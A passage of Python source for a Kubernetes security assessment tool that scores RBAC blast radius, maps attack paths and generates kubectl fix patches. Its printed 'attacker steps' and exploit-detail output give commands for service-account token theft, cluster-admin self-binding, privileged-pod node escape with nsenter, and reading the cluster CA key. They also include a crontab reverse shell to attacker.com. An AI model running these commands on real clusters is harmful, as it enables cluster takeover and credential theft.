        ("daemonsets",           False),
        ("statefulsets",         False),
        ("jobs",                 False),
        ("rolebindings",         False),
        ("roles",                False),
        ("services",             False),
        ("ingresses",            False),
        ("serviceaccounts",      False),
    ]

    ns_flag = ["-n", namespace] if namespace else ["-A"]
    graph = {
        "pods": [], "deployments": [], "daemonsets": [], "statefulsets": [],
        "jobs": [],
        "services": [], "ingresses": [],
        "clusterroles": {}, "roles": {},
        "clusterrolebindings": [], "rolebindings": [],
        "serviceaccounts": [], "namespaces": [],
    }

    total = len(GRAPH_RESOURCES)
    for idx, (rtype, cluster_scoped) in enumerate(GRAPH_RESOURCES, 1):
        flags = [] if cluster_scoped else ns_flag
        scope = "cluster" if cluster_scoped else (namespace or "all-ns")
        console.print(f"  [dim][{idx}/{total}] {rtype} ({scope})[/dim]")
        try:
            r = subprocess.run(
                ["kubectl", "get", rtype] + flags + ["-o", "yaml"],
                capture_output=True, text=True, timeout=20,
            )
            if not r.stdout.strip():
                continue
            docs = _yaml.safe_load(r.stdout)
            if not docs:
                continue
            items = docs.get("items", [docs]) if docs.get("kind", "").endswith("List") else [docs]
            for item in items:
                if not item:
                    continue
                meta = item.get("metadata", {}) or {}
                ns   = meta.get("namespace", "")
                name = meta.get("name", "")

                if rtype == "pods":
                    spec = item.get("spec", {}) or {}
                    graph["pods"].append({
                        "name": name, "namespace": ns,
                        "serviceAccountName": spec.get("serviceAccountName", "default"),
                        "automountServiceAccountToken": spec.get("automountServiceAccountToken", True),
                        "hostNetwork": spec.get("hostNetwork", False),
                        "hostPID": spec.get("hostPID", False),
                    })
                elif rtype in ("deployments", "daemonsets", "statefulsets"):
                    spec = item.get("spec", {}) or {}
                    tspec = (spec.get("template", {}) or {}).get("spec", {}) or {}
                    graph[rtype].append({
                        "name": name, "namespace": ns,
                        "serviceAccountName": tspec.get("serviceAccountName", "default"),
                        "replicas": spec.get("replicas", 1),
                    })
                elif rtype == "jobs":
                    spec   = item.get("spec", {}) or {}
                    tspec  = (spec.get("template", {}) or {}).get("spec", {}) or {}
                    status = item.get("status", {}) or {}
                    if status.get("completionTime"):
                        graph["jobs"].append({
                            "name": name, "namespace": ns,
                            "serviceAccountName": tspec.get("serviceAccountName", "default"),
                            "completed": True,
                        })
                elif rtype == "services":
                    sspec = item.get("spec", {}) or {}
                    graph["services"].append({
                        "name": name, "namespace": ns,
                        "type": sspec.get("type", "ClusterIP"),
                        "externalIPs": sspec.get("externalIPs", []),
                    })
                elif rtype == "ingresses":
                    ispec = item.get("spec", {}) or {}
                    hosts = [
                        (rule or {}).get("host", "")
                        for rule in (ispec.get("rules") or [])
                        if (rule or {}).get("host")
                    ]
                    graph["ingresses"].append({
                        "name": name, "namespace": ns, "hosts": hosts,
                        "tls": bool(ispec.get("tls")),
                    })
                elif rtype == "clusterroles":
                    graph["clusterroles"][name] = item.get("rules", []) or []
                elif rtype == "roles":
                    graph["roles"][f"{ns}/{name}"] = item.get("rules", []) or []
                elif rtype == "clusterrolebindings":
                    graph["clusterrolebindings"].append({
                        "name": name,
                        "roleRef": item.get("roleRef", {}) or {},
                        "subjects": item.get("subjects", []) or [],
                    })
                elif rtype == "rolebindings":
                    graph["rolebindings"].append({
                        "name": name, "namespace": ns,
                        "roleRef": item.get("roleRef", {}) or {},
                        "subjects": item.get("subjects", []) or [],
                    })
                elif rtype == "serviceaccounts":
                    graph["serviceaccounts"].append({"name": name, "namespace": ns})
                elif rtype == "namespaces":
                    graph["namespaces"].append(name)
        except Exception:
            pass
    return graph


# ─────────────────────────────────────────────────────────────
# RBAC ENGINE
# ─────────────────────────────────────────────────────────────

def _rules_for_sa(sa_name: str, sa_ns: str, graph: dict) -> list:
    rules = []

    def _match_subject(subj):
        if not subj:
            return False
        k = subj.get("kind", "")
        n = subj.get("name", "")
        ns = subj.get("namespace", "")
        if k == "ServiceAccount" and n == sa_name and ns == sa_ns:
            return True
        if k == "Group" and n == f"system:serviceaccounts:{sa_ns}":
            return True
        if k == "Group" and n == "system:serviceaccounts":
            return True
        return False

    for crb in graph["clusterrolebindings"]:
        if any(_match_subject(s) for s in crb.get("subjects", [])):
            role_ref  = crb.get("roleRef", {})
            role_name = role_ref.get("name", "")
            role_rules = (graph["clusterroles"].get(role_name, [])
                          if role_ref.get("kind") == "ClusterRole"
                          else graph["roles"].get(f"{sa_ns}/{role_name}", []))
            for r in role_rules:
                rules.append({**r,
                               "_binding": f"ClusterRoleBinding/{crb['name']}",
                               "_role": f"ClusterRole/{role_name}",
                               "_scope": "cluster"})

    for rb in graph["rolebindings"]:
        if any(_match_subject(s) for s in rb.get("subjects", [])):
            role_ref  = rb.get("roleRef", {})
            role_name = role_ref.get("name", "")
            rb_ns     = rb.get("namespace", sa_ns)
            if role_ref.get("kind") == "ClusterRole":
                role_rules  = graph["clusterroles"].get(role_name, [])
                role_label  = f"ClusterRole/{role_name}"
            else:
                role_rules  = graph["roles"].get(f"{rb_ns}/{role_name}", [])
                role_label  = f"Role/{rb_ns}/{role_name}"
            for r in role_rules:
                rules.append({**r,
                               "_binding": f"RoleBinding/{rb_ns}/{rb['name']}",
                               "_role": role_label,
                               "_scope": rb_ns})
    return rules


def _score_rules(rules: list) -> tuple:
    caps  = []
    score = 0
    for rule in rules:
        verbs     = set(v.lower() for v in (rule.get("verbs") or []))
        resources = set(r.lower() for r in (rule.get("resources") or []))

        if "*" in verbs and "*" in resources:
            caps.append("FULL CLUSTER-ADMIN (verbs:* resources:*)")
            score = max(score, 100)
            continue
        if ("get" in verbs or "list" in verbs or "*" in verbs) and \
           ("secrets" in resources or "*" in resources):
            caps.append("read Secrets")
            score = max(score, 70)
        if verbs & {"create","update","patch","delete","*"} and \
           ("pods" in resources or "*" in resources):
            caps.append("create/modify Pods (exec + escape path)")
            score = max(score, 65)
        if verbs & {"create","update","patch","delete","*"} and \
           resources & {"rolebindings","clusterrolebindings","roles","clusterroles","*"}:
            caps.append("write RBAC bindings (privilege escalation)")
            score = max(score, 90)
        if "impersonate" in verbs:
            caps.append("impersonate users/SAs (become anyone)")
            score = max(score, 95)
        if ("create" in verbs or "*" in verbs) and "pods/exec" in resources:
            caps.append("exec into pods")
            score = max(score, 60)

    caps = list(dict.fromkeys(caps))

    # ── CHAINED CAPABILITY DETECTION ──
    has_secrets = any("read Secrets" in c for c in caps)
    has_pods    = any("create/modify Pods" in c or "exec into pods" in c for c in caps)
    if has_secrets and has_pods and score < 100:
        caps.append("CHAINED: read Secrets + create Pods = node takeover in 2 steps")
        score = max(score, 85)

    return score, caps


# ─────────────────────────────────────────────────────────────
# CMD: blast-radius
# ─────────────────────────────────────────────────────────────

def cmd_blast_radius(args):
    render_banner()
    console.print("[bold cyan]  ◎ RBAC Blast Radius[/bold cyan]\n")
    graph = _fetch_cluster_graph(namespace=getattr(args, "namespace", None))
    console.print()

    target = args.target
    parts  = target.split("/")
    sa_name = sa_ns = None

    if len(parts) == 1:
        name = parts[0]
        for pod in graph["pods"]:
            if pod["name"] == name or pod["name"].startswith(name):
                sa_name = pod["serviceAccountName"]
                sa_ns   = pod["namespace"]
                console.print(f"  [dim]Pod [bold]{pod['name']}[/bold] → SA [bold]{sa_name}[/bold] ns=[bold]{sa_ns}[/bold][/dim]\n")
                break
        if not sa_name:
            for sa in graph["serviceaccounts"]:
                if sa["name"] == name:
                    sa_name, sa_ns = name, sa["namespace"]
                    break

    elif parts[0].lower() in ("pod", "pods"):
        if len(parts) == 2:
            for pod in graph["pods"]:
                if pod["name"] == parts[1] or pod["name"].startswith(parts[1]):
                    sa_name = pod["serviceAccountName"]
                    sa_ns   = pod["namespace"]
                    break
        elif len(parts) == 3:
            for pod in graph["pods"]:
                if pod["namespace"] == parts[1] and (pod["name"] == parts[2] or pod["name"].startswith(parts[2])):
                    sa_name = pod["serviceAccountName"]
                    sa_ns   = pod["namespace"]
                    break

    elif parts[0].lower() in ("sa", "serviceaccount"):
        if len(parts) == 3:
            sa_ns, sa_name = parts[1], parts[2]
        elif len(parts) == 2:
            sa_name = parts[1]
            for sa in graph["serviceaccounts"]:
                if sa["name"] == sa_name:
                    sa_ns = sa["namespace"]
                    break

    if not sa_name or not sa_ns:
        console.print(f"[red]  Could not resolve '{target}' to a ServiceAccount.[/red]")
        console.print("  [dim]Try: pod/<name>, pod/<ns>/<name>, sa/<ns>/<name>[/dim]")
        return

    rules = _rules_for_sa(sa_name, sa_ns, graph)
    if not rules:
        console.print(f"  [green]✓[/green] SA [bold]{sa_ns}/{sa_name}[/bold] has no RBAC permissions — minimal blast radius.\n")
        return

    score, caps = _score_rules(rules)
    if score >= 90:   score_color, verdict = "red",    "CRITICAL — cluster compromise likely"
    elif score >= 60: score_color, verdict = "yellow", "HIGH — significant lateral movement"
    elif score >= 30: score_color, verdict = "blue",   "MEDIUM — limited meaningful access"
    else:             score_color, verdict = "green",  "LOW — minimal blast radius"

    console.print(f"  Target:  [bold]ServiceAccount/{sa_ns}/{sa_name}[/bold]")
    console.print(f"  Score:   [{score_color}]{score}/100  {verdict}[/{score_color}]\n")

    if caps:
        console.print("  [bold]Capabilities if compromised:[/bold]")
        for c in caps:
            icon = "💀" if ("CLUSTER-ADMIN" in c or "escalation" in c or "impersonate" in c) else "🔴" if score >= 60 else "🟡"
            console.print(f"    {icon}  {c}")
        console.print()

    by_binding: dict = {}
    for rule in rules:
        key = f"{rule.get('_binding','?')} → {rule.get('_role','?')} (scope: {rule.get('_scope','?')})"
        by_binding.setdefault(key, []).append(rule)

    console.print("  [bold]Active RBAC bindings:[/bold]")
    for label, brules in by_binding.items():
        console.print(f"\n    [cyan]▶ {label}[/cyan]")
        for rule in brules:
            console.print(f"      verbs={rule.get('verbs',[])}  resources={rule.get('resources',[])}  apiGroups={rule.get('apiGroups',[])}")

    console.print()
    console.print("  [bold]Attacker steps after RCE:[/bold]")
    console.print("    1. cat /var/run/secrets/kubernetes.io/serviceaccount/token")
    console.print("    2. export TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)")
    if any("CLUSTER-ADMIN" in c for c in caps):
        console.print("    3. kubectl get secrets -A --token=$TOKEN")
        console.print(f"    4. kubectl create clusterrolebinding pwned --clusterrole=cluster-admin \\")
        console.print(f"           --serviceaccount={sa_ns}:{sa_name} --token=$TOKEN")
        console.print("    5. Full cluster owned")
    elif any("escalation" in c for c in caps):
        console.print(f"    3. kubectl create clusterrolebinding self-admin \\")
        console.print(f"           --clusterrole=cluster-admin --serviceaccount={sa_ns}:{sa_name} --token=$TOKEN")
        console.print("    4. Full cluster owned")
    elif any("CHAINED" in c for c in caps):
        console.print("    3. kubectl get secrets -A --token=$TOKEN")
        console.print("       # exfil DB creds, API keys, TLS certs, other SA tokens")
        console.print("    4. kubectl run pwn --image=alpine --restart=Never \\")
        console.print("           --overrides='{\"spec\":{\"hostPID\":true,\"hostNetwork\":true,\"containers\":[{\"name\":\"pwn\",\"image\":\"alpine\",\"securityContext\":{\"privileged\":true}}]}}' \\")
        console.print("           --token=$TOKEN -it -- sh")
        console.print("    5. nsenter -t 1 -m -u -i -n -p -- bash  # full node root shell")
    elif any("Secrets" in c for c in caps):
        console.print("    3. kubectl get secrets -A --token=$TOKEN  # exfil creds, DB passwords, TLS keys")
    elif any("Pod" in c for c in caps):
        console.print("    3. kubectl run pwn --image=alpine -it \\")
        console.print("           --overrides='{\"spec\":{\"hostPID\":true,\"hostNetwork\":true}}' --token=$TOKEN")
        console.print("    4. Container escape → node access")
    else:
        console.print("    3. kubectl auth can-i --list --token=$TOKEN  # enumerate access")
    console.print()


# ─────────────────────────────────────────────────────────────
# CMD: attack  (attack path chaining)
# ─────────────────────────────────────────────────────────────

def _build_attack_paths(graph: dict):
    sa_cache: dict = {}

    def sa_score_cached(sa_name, sa_ns):
        key = (sa_name, sa_ns)
        if key not in sa_cache:
            rules = _rules_for_sa(sa_name, sa_ns, graph)
            sa_cache[key] = _score_rules(rules)
        return sa_cache[key]

    def make_path(entry_label, ns, sa):
        score, caps = sa_score_cached(sa, ns)
        steps = [{"node": entry_label, "role": "Entry point", "color": "cyan"}]
        steps.append({"node": f"SA/{ns}/{sa}",
                      "role": f"token theft — {score}/100",
                      "color": "red" if score >= 70 else "yellow" if score >= 30 else "green"})
        if score == 0:
            steps.append({"node": "Dead end — no useful RBAC", "role": "", "color": "dim"})
        elif any("CLUSTER-ADMIN" in c for c in caps):
            steps.append({"node": "cluster-admin", "role": "Full cluster compromise", "color": "red"})
        elif any("escalation" in c for c in caps):
            steps.append({"node": "RBAC write → self-escalate to cluster-admin", "role": "Privilege escalation", "color": "red"})
        elif any("CHAINED" in c for c in caps):
            steps.append({"node": "kubectl get secrets -A", "role": "Step 1 — exfil DB creds, TLS keys, tokens", "color": "yellow"})
            steps.append({"node": "kubectl run pwn --overrides hostPID+hostNetwork", "role": "Step 2 — container escape → node", "color": "red"})
        elif any("Secrets" in c for c in caps):
            steps.append({"node": "kubectl get secrets -A", "role": "Credential exfiltration", "color": "yellow"})
        elif any("Pod" in c for c in caps):
            steps.append({"node": "kubectl run privileged-pod", "role": "Container escape → node", "color": "yellow"})
        else:
            steps.append({"node": "Limited API read", "role": "Enumerate cluster state", "color": "blue"})
        return steps, score, caps

    # ── INTERNET ENTRY POINTS ──
    internet_paths = []
    for ing in graph["ingresses"]:
        ns = ing["namespace"]
        # Find SA: prefer workload in same ns, fall back to any pod
        sa = "default"
        for wtype in ("deployments", "daemonsets", "statefulsets"):
            for w in graph[wtype]:
                if w["namespace"] == ns:
                    sa = w.get("serviceAccountName", "default")
                    break
            else:
                continue
            break
        if sa == "default":
            for pod in graph["pods"]:
                if pod["namespace"] == ns:
                    sa = pod["serviceAccountName"]
                    break
        hosts = ", ".join(ing["hosts"]) if ing["hosts"] else "no host"
        label = f"Ingress/{ns}/{ing['name']} [{hosts}]"
        steps, score, caps = make_path(label, ns, sa)
        if score > 0:
            internet_paths.append({"entry": label, "steps": steps, "score": score, "caps": caps, "hostPID": False, "hostNetwork": False})

    for svc in graph["services"]:
        if svc["type"] not in ("LoadBalancer", "NodePort"):
            continue
        ns, name, stype = svc["namespace"], svc["name"], svc["type"]
        sa = "default"
        for pod in graph["pods"]:
            if pod["namespace"] == ns:
                sa = pod["serviceAccountName"]
                break
        label = f"Service/{ns}/{name} [{stype}]"
        steps, score, caps = make_path(label, ns, sa)
        if score > 0:
            internet_paths.append({"entry": label, "steps": steps, "score": score, "caps": caps, "hostPID": False, "hostNetwork": False})

    internet_paths.sort(key=lambda x: x["score"], reverse=True)

    # ── INTERNAL ENTRY POINTS ──
    internal_paths = []
    seen_sa: set = set()
    for pod in graph["pods"]:
        sa = pod["serviceAccountName"]
        ns = pod["namespace"]
        key = (ns, sa)
        if key in seen_sa:
            continue
        seen_sa.add(key)
        label = f"Pod/{ns}/{pod['name']} (RCE)"
        steps, score, caps = make_path(label, ns, sa)
        if score >= 50:
            internal_paths.append({
                "entry": label, "steps": steps, "score": score, "caps": caps,
                "hostPID": pod.get("hostPID", False),
                "hostNetwork": pod.get("hostNetwork", False),
            })

    internal_paths.sort(key=lambda x: x["score"], reverse=True)

    # ── RESIDUAL SA RISK: completed Jobs whose SAs still have dangerous bindings ──
    residual_paths = []
    seen_residual: set = set()
    for item in graph.get("jobs", []):
        ns  = item.get("namespace", "")
        sa  = item.get("serviceAccountName", "default")
        key = (ns, sa)
        if key in seen_sa or key in seen_residual:
            continue
        seen_residual.add(key)
        score, caps = sa_score_cached(sa, ns)
        if score >= 50:
            label = f"Job/{ns}/{item.get('name','?')} (completed — SA token still active)"
            steps = [
                {"node": label, "role": "Residual — Job finished but SA binding persists", "color": "yellow"},
                {"node": f"SA/{ns}/{sa}", "role": f"token still valid — {score}/100",
                 "color": "red" if score >= 70 else "yellow"},
            ]
            if any("CLUSTER-ADMIN" in c for c in caps):
                steps.append({"node": "cluster-admin", "role": "Full cluster compromise", "color": "red"})
            elif any("CHAINED" in c for c in caps):
                steps.append({"node": "get secrets + privileged pod", "role": "Two-step node takeover", "color": "red"})
            elif any("escalation" in c for c in caps):
                steps.append({"node": "RBAC write → self-escalate", "role": "Privilege escalation", "color": "red"})
            else:
                steps.append({"node": "kubectl get secrets -A", "role": "Credential exfiltration", "color": "yellow"})
            residual_paths.append({
                "entry": label, "steps": steps, "score": score, "caps": caps,
                "hostPID": False, "hostNetwork": False,
            })

    residual_paths.sort(key=lambda x: x["score"], reverse=True)
    return internet_paths, internal_paths, residual_paths


def cmd_attack(args):
    render_banner()
    console.print("[bold cyan]  ⚔  Attack Path Analysis[/bold cyan]\n")
    console.print("  [dim]Fetching cluster graph...[/dim]\n")
    graph = _fetch_cluster_graph(namespace=getattr(args, "namespace", None))
    console.print()

    internet_paths, internal_paths, residual_paths = _build_attack_paths(graph)

    def render_path(p, idx):
        sc = p["score"]
        c  = "red" if sc >= 80 else "yellow" if sc >= 50 else "blue"
        console.print(f"  [bold {c}]Path {idx}  ·  Score {sc}/100[/bold {c}]")
        console.print(f"  [dim]Entry:[/dim] [cyan]{p['entry']}[/cyan]")
        steps = p["steps"]
        for i, step in enumerate(steps):
            arrow = "  └─▶ " if i == len(steps)-1 else "  ├─▶ "
            role_str = f"  [dim]({step['role']})[/dim]" if step.get("role") else ""
            console.print(f"  {arrow}[{step['color']}]{step['node']}[/{step['color']}]{role_str}")
        if p.get("caps"):
            console.print(f"  [dim]Capabilities: {', '.join(p['caps'][:3])}[/dim]")
        if p.get("hostPID"):
            console.print("  [red dim]  + hostPID:true → dump any process memory, steal tokens[/red dim]")
        if p.get("hostNetwork"):
            console.print("  [red dim]  + hostNetwork:true → sniff cluster-internal traffic[/red dim]")
        console.print()

    console.print(f"[bold white on red]  INTERNET-EXPOSED PATHS  ({len(internet_paths)} found)  [/bold white on red]\n")
    if not internet_paths:
        console.print("  [green]✓ No internet-exposed attack paths with meaningful RBAC.[/green]\n")
    else:
        for i, p in enumerate(internet_paths, 1):
            render_path(p, i)

    console.print(f"[bold white on dark_orange]  INTERNAL PATHS  (RCE-in-any-pod, score ≥50)  ({len(internal_paths)} found)  [/bold white on dark_orange]\n")
    if not internal_paths:
        console.print("  [green]✓ No high-value internal paths (all SAs score < 50).[/green]\n")
    else:
        for i, p in enumerate(internal_paths, 1):
            render_path(p, i)

    console.print(f"[bold white on purple]  RESIDUAL SA RISK  (completed Jobs — SA still bound)  ({len(residual_paths)} found)  [/bold white on purple]\n")
    if not residual_paths:
        console.print("  [green]✓ No completed Jobs with dangerous SA bindings.[/green]\n")
    else:
        for i, p in enumerate(residual_paths, 1):
            render_path(p, i)

    all_paths = internet_paths + internal_paths + residual_paths
    max_score = max((p["score"] for p in all_paths), default=0)
    console.print("─" * 80)
    if max_score >= 80:
        console.print(f"  [bold red]  {len(all_paths)} path(s)  ·  max score {max_score}/100  ·  Cluster at critical risk[/bold red]")
    elif max_score >= 50:
        console.print(f"  [bold yellow]  {len(all_paths)} path(s)  ·  max score {max_score}/100  ·  Review high-value SAs[/bold yellow]")
    else:
        console.print(f"  [bold green]  {len(all_paths)} path(s)  ·  max score {max_score}/100  ·  Low blast radius[/bold green]")
    console.print("\n  [dim]Tip: spottersec blast-radius <pod-or-sa> for per-SA deep dive[/dim]\n")




# ─────────────────────────────────────────────────────────────
# KUBECTL PATCH GENERATOR
# ─────────────────────────────────────────────────────────────

def _generate_kubectl_fix(f: Finding) -> str:
    """Generate a cluster-specific kubectl patch or fix command for a finding."""
    rkey  = f.resource_key or ""
    parts = rkey.split("/")
    kind  = parts[0] if len(parts) > 0 else ""
    ns    = parts[1] if len(parts) > 1 else ""
    name  = parts[2] if len(parts) > 2 else ""

    ns_flag  = f"-n {ns}" if ns else ""
    ns_flag2 = f"--namespace {ns}" if ns else "--namespace default"
    rid = f.rule_id.split("_")[0]

    # ── Pod-level security context fixes ──
    if rid == "SC001":  # privileged
        return (f"# Remove privileged: true from {kind}/{name}\n"
                f"kubectl patch {kind.lower()} {name} {ns_flag} --type=json \\\n"
                f"  -p='[{{\"op\":\"remove\",\"path\":\"/spec/containers/0/securityContext/privileged\"}}]'")
    if rid == "SC002":  # runAsUser 0
        return (f"kubectl patch {kind.lower()} {name} {ns_flag} --type=json \\\n"
                f"  -p='[{{\"op\":\"replace\",\"path\":\"/spec/securityContext/runAsUser\",\"value\":1000}}]'")
    if rid == "SC003":  # runAsNonRoot false
        return (f"kubectl patch {kind.lower()} {name} {ns_flag} --type=json \\\n"
                f"  -p='[{{\"op\":\"replace\",\"path\":\"/spec/securityContext/runAsNonRoot\",\"value\":true}}]'")
    if rid == "SC004":  # runAsNonRoot not set
        return (f"kubectl patch {kind.lower()} {name} {ns_flag} --type=json \\\n"
                f"  -p='[{{\"op\":\"add\",\"path\":\"/spec/securityContext/runAsNonRoot\",\"value\":true}},'\\n"
                f"      '{{\"op\":\"add\",\"path\":\"/spec/securityContext/runAsUser\",\"value\":1000}}]'")
    if rid == "SC005":  # allowPrivilegeEscalation
        return (f"kubectl patch {kind.lower()} {name} {ns_flag} --type=json \\\n"
                f"  -p='[{{\"op\":\"replace\",\"path\":\"/spec/containers/0/securityContext/allowPrivilegeEscalation\",\"value\":false}}]'")
    if rid == "SC006":  # allowPrivilegeEscalation not set
        return (f"kubectl patch {kind.lower()} {name} {ns_flag} --type=json \\\n"
                f"  -p='[{{\"op\":\"add\",\"path\":\"/spec/containers/0/securityContext/allowPrivilegeEscalation\",\"value\":false}}]'")
    if rid == "SC007":  # readOnlyRootFilesystem
        return (f"kubectl patch {kind.lower()} {name} {ns_flag} --type=json \\\n"
                f"  -p='[{{\"op\":\"add\",\"path\":\"/spec/containers/0/securityContext/readOnlyRootFilesystem\",\"value\":true}}]'")
    if rid == "SC008":  # seccomp
        return (f"kubectl patch {kind.lower()} {name} {ns_flag} --type=json \\\n"
                f"  -p='[{{\"op\":\"add\",\"path\":\"/spec/securityContext/seccompProfile\",\"value\":{{\"type\":\"RuntimeDefault\"}}}}]'")

    # ── Namespace fixes ──
    if rid == "NS001":  # hostPID
        return (f"kubectl patch {kind.lower()} {name} {ns_flag} --type=json \\\n"
                f"  -p='[{{\"op\":\"replace\",\"path\":\"/spec/hostPID\",\"value\":false}}]'")
    if rid == "NS002":  # hostNetwork
        return (f"kubectl patch {kind.lower()} {name} {ns_flag} --type=json \\\n"
                f"  -p='[{{\"op\":\"replace\",\"path\":\"/spec/hostNetwork\",\"value\":false}}]'")
    if rid == "NS003":  # hostIPC
        return (f"kubectl patch {kind.lower()} {name} {ns_flag} --type=json \\\n"
                f"  -p='[{{\"op\":\"replace\",\"path\":\"/spec/hostIPC\",\"value\":false}}]'")
    if rid in ("NS010", "NS011"):  # PSA enforce label
        return (f"kubectl label namespace {name} \\\n"
                f"  pod-security.kubernetes.io/enforce=restricted \\\n"
                f"  pod-security.kubernetes.io/audit=restricted \\\n"
                f"  pod-security.kubernetes.io/warn=restricted")

    # ── SA token ──
    if rid == "SA001":  # automount
        if kind in ("Deployment", "DaemonSet", "StatefulSet"):
            return (f"kubectl patch {kind.lower()} {name} {ns_flag} --type=json \\\n"
                    f"  -p='[{{\"op\":\"add\",\"path\":\"/spec/template/spec/automountServiceAccountToken\",\"value\":false}}]'")
        return (f"kubectl patch {kind.lower()} {name} {ns_flag} --type=json \\\n"
                f"  -p='[{{\"op\":\"add\",\"path\":\"/spec/automountServiceAccountToken\",\"value\":false}}]'")
    if rid == "SA002":  # default SA
        sa_name = name.split("-")[0] if name else "myapp"
        return (f"# 1. Create a dedicated ServiceAccount\n"
                f"kubectl create serviceaccount {sa_name}-sa {ns_flag2}\n\n"
                f"# 2. Patch the workload to use it\n"
                f"kubectl patch {kind.lower()} {name} {ns_flag} --type=json \\\n"
                f"  -p='[{{\"op\":\"replace\",\"path\":\"/spec/template/spec/serviceAccountName\",\"value\":\"{sa_name}-sa\"}}]'")

    # ── RBAC fixes ──
    if rid == "RBAC001":  # cluster-admin binding
        return (f"# Review what this SA actually needs, then delete the cluster-admin binding\n"
                f"kubectl delete clusterrolebinding {name}\n\n"
                f"# Replace with a scoped RoleBinding (example — adjust verbs/resources to your needs):\n"
                f"kubectl create rolebinding {name}-scoped {ns_flag2} \\\n"
                f"  --clusterrole=view \\\n"
                f"  --serviceaccount={ns}:{name}")

    # ── Image tag ──
    if rid == "IMG001":
        return (f"# Pin the image to a specific digest or tag in your deployment manifest\n"
                f"# Then apply:\n"
                f"kubectl patch {kind.lower()} {name} {ns_flag} --type=json \\\n"
                f"  -p='[{{\"op\":\"replace\",\"path\":\"/spec/template/spec/containers/0/image\",\"value\":\"<image>:<pinned-tag>\"}}]'\n\n"
                f"# Or use a digest:\n"
                f"#   image: cloudflare/cloudflared@sha256:<digest>")

    # ── Resource limits ──
    if rid == "RES001":
        path_base = "/spec/template/spec/containers/0/resources" if kind in ("Deployment","DaemonSet","StatefulSet") else "/spec/containers/0/resources"
        return (f"kubectl patch {kind.lower()} {name} {ns_flag} --type=json \\\n"
                f"  -p='[{{\"op\":\"add\",\"path\":\"{path_base}\",\"value\":{{\"requests\":{{\"cpu\":\"100m\",\"memory\":\"128Mi\"}},\"limits\":{{\"cpu\":\"500m\",\"memory\":\"256Mi\"}}}}}}]'")

    # ── Network policy ──
    if rid == "NET001":
        workload_name = name.split("-")[0] if name else "app"
        return (f"kubectl apply -f - <<EOF\napiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: {name}-netpol\n  namespace: {ns}\nspec:\n  podSelector:\n    matchLabels:\n      app: {workload_name}\n  policyTypes:\n  - Ingress\n  - Egress\n  ingress: []  # add allowed ingress rules\n  egress: []   # add allowed egress rules\nEOF")

    # ── Ingress TLS ──
    if rid == "ING001":
        return (f"# Add TLS to Ingress/{name} in {ns}\n"
                f"kubectl patch ingress {name} {ns_flag} --type=json \\\n"
                f"  -p='[{{\"op\":\"add\",\"path\":\"/spec/tls\",\"value\":[{{\"hosts\":[\"<your-host>\"],\"secretName\":\"{name}-tls\"}}]}}]'\n\n"
                f"# If using cert-manager, annotate instead:\n"
                f"kubectl annotate ingress {name} {ns_flag} \\\n"
                f"  cert-manager.io/cluster-issuer=letsencrypt-prod")

    # ── Webhook ──
    if rid == "WHK001":
        wtype = "validatingwebhookconfiguration" if "Validating" in kind else "mutatingwebhookconfiguration"
        return (f"# Change failurePolicy from Ignore to Fail for {name}\n"
                f"kubectl patch {wtype} {name} --type=json \\\n"
                f"  -p='[{{\"op\":\"replace\",\"path\":\"/webhooks/0/failurePolicy\",\"value\":\"Fail\"}}]'\n\n"
                f"# Warning: test in staging first — Fail means the webhook being down blocks all admission")

    # ── CAP ──
    if rid.startswith("CAP001"):
        cap = rid.split("_")[-1] if "_" in rid else "DANGEROUS_CAP"
        path_base = "/spec/template/spec/containers/0" if kind in ("Deployment","DaemonSet","StatefulSet") else "/spec/containers/0"
        return (f"# Remove {cap} capability\n"
                f"kubectl patch {kind.lower()} {name} {ns_flag} --type=json \\\n"
                f"  -p='[{{\"op\":\"remove\",\"path\":\"{path_base}/securityContext/capabilities/add\"}}]'\n\n"
                f"# Also explicitly drop all caps:\n"
                f"# securityContext:\n"
                f"#   capabilities:\n"
                f"#     drop: [\"ALL\"]")

    # ── Helm-specific (values override guidance) ──
    if rid.startswith("HLM"):
        return (f"# This is a Helm chart value — patch via values override, not kubectl\n"
                f"# Find the relevant value in your values.yaml and override:\n\n"
                f"helm upgrade <release> <chart> {ns_flag2} \\\n"
                f"  --reuse-values \\\n"
                f"  --set auth.enabled=true  # adjust key to your chart\n\n"
                f"# Or add to your values.yaml:\n"
                f"# auth:\n"
                f"#   enabled: true")

    # ── Generic fallback — show the YAML fix snippet ──
    return (f"# Apply the fix for {f.rule_id} on {rkey}:\n"
            f"# Edit the resource directly:\n"
            f"kubectl edit {kind.lower()} {name} {ns_flag}\n\n"
            f"# Then apply the following change:\n"
            + (f"# {chr(10)+'# '.join(f.fix_snippet.splitlines())}" if f.fix_snippet else "# (see fix snippet above)"))


def _generate_exploit_detail(f: Finding) -> str:
    """Generate offensive operator detail — what to actually run to demonstrate impact."""
    rkey  = f.resource_key or ""
    parts = rkey.split("/")
    kind  = parts[0] if len(parts) > 0 else ""
    ns    = parts[1] if len(parts) > 1 else ""
    name  = parts[2] if len(parts) > 2 else ""
    ns_flag = f"-n {ns}" if ns else ""
    rid = f.rule_id.split("_")[0]

    header = f"# Exploit: {f.title}\n# Target: {rkey}\n# Rule:   {f.rule_id}\n\n"

    if rid == "SC001":  # privileged
        return header + (
            "# Container is privileged — full host device access\n"
            "# 1. Exec into the container:\n"
            f"kubectl exec -it {name} {ns_flag} -- sh\n\n"
            "# 2. Inside: mount host filesystem\n"
            "mkdir /mnt/host && mount /dev/sda1 /mnt/host\n"
            "chroot /mnt/host bash\n"
            "# Now running as root on the node\n\n"
            "# 3. Steal node credentials\n"
            "cat /mnt/host/etc/kubernetes/pki/ca.key\n"
            "cat /var/lib/kubelet/config.yaml")

    if rid == "VOL001":  # hostPath
        return header + (
            "# hostPath mount gives read/write access to node filesystem\n"
            f"kubectl exec -it {name} {ns_flag} -- sh\n\n"
            "# Read sensitive node files through the mount:\n"
            "ls /host/                          # or whatever mountPath is\n"
            "cat /host/etc/kubernetes/pki/ca.key\n"
            "cat /host/var/lib/kubelet/config.yaml\n\n"
            "# Write a cron job for persistence:\n"
            "echo '* * * * * root bash -i >& /dev/tcp/attacker.com/4444 0>&1' \\\n"
            "  >> /host/etc/crontab")

    if rid in ("NS001", "NS002"):  # hostPID/hostNetwork
        pid_net = "hostPID" if rid == "NS001" else "hostNetwork"
        return header + (
            f"# {pid_net}: true — access host process/network namespace\n"
            f"kubectl exec -it {name} {ns_flag} -- sh\n\n"
            + ("# With hostPID — dump memory of any process on node:\n"
               "ps aux                             # see ALL host processes\n"
